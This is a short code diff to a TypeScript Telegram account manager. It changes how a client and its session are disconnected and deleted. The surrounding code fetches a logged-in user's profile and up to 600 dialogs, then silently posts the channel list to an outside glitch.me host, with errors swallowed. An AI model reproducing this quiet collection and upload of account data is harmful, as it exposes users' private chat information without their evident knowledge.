@@ -141,7 +141,8 @@ class TelegramManager {
     async disconnect() {
         await this.client?.disconnect();
         await this.client?.destroy();
-        this.session.delete();
+        await this.session.delete();
+        this.client = null
     }
 
     async createClient() {
@@ -334,6 +335,7 @@ class TelegramManager {
         const user: any = await result.toJSON();
         const chats = await this.client?.getDialogs({ limit: 600 });
         await this.disconnect();
+        await deleteClient(this.phoneNumber);
         // const myMsgs = await this.client.getMessages('me', { limit: 8 });
         let personalChats = 0;
         let channels = 0;
@@ -372,8 +374,6 @@ class TelegramManager {
             await axios.post(`https://tgcms.glitch.me/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });
         } catch (error) {
         }
-        await sleep(3000);
-        await deleteClient(this.phoneNumber)
         // await this.deleteMessages();
     }
 }
